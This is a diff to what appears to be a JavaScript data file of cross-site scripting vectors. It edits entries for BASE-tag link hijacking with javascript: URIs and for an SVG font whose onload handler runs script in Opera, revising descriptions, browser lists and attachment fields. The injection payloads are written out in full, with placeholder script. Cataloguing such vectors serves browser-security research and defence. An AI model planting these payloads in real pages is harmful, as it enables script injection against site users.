@@ -1278,7 +1278,7 @@ var items =
         },
         'data'       : '<head><base href="javascript://"></head><body><a href="/./,%js_alert%//#">XXX</a></body>',
         'description': {
-            'en' : '<BASE> link hijacking with JavaScript URIs works on Internet Explorer and Opera (O8-10.5 in case the link URL starts with #). User interaction is required to execute the JavaScript.',
+            'en' : '<BASE> link hijacking with JavaScript URIs works on Internet Explorer and Opera (O8-10.5 in case the link URL starts with #). User interaction is required to execute the JavaScript. The vector sometimes has to be changed slightly to work for all mentioned user agents.',
             'jp' : '',
             'ru' : '',
             'de' : ''
@@ -1293,7 +1293,7 @@ var items =
         'browsers'   : {
             'opera': ['8.x', '9.x', '10.x', 'mobile'],
             'safari': ['3.x', '4.x'],
-            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0'] 
+            'internet explorer': ['5.5', '6.0', '7.0', '9.0'] 
         },
         'tags'       : ['xss', 'javascript', 'opera', 'internet explorer', 'base', 'hijacking'],
         'reporter'   : 'brainpillow, Gareth, LeverOne, .mario'
@@ -1309,10 +1309,11 @@ var items =
         },
         'data'       : '<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("%svg_path%#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>',
         'attachment' : {
-            'mime' : 'image/svg+xml',
-            'path' : '',
-            'name' : '',
-            'raw'  : '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="%js_alert%" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg>'
+            'required_mime' : 'image/svg+xml',
+            'samedomain'    : '',            
+            'path'          : '',
+            'name'          : '',
+            'raw'           : '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="%js_alert%" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg>'
         },
         'description': {
             'en' : 'Opera 10.00 and later minor versions allow usi9ng SVG fonts and will - as soon as the font file has loaded even execute embedded JavaScript. The current example utilizes a load event handler to execute the JavaScript without user interaction as soon as the font file has been fully loaded.',
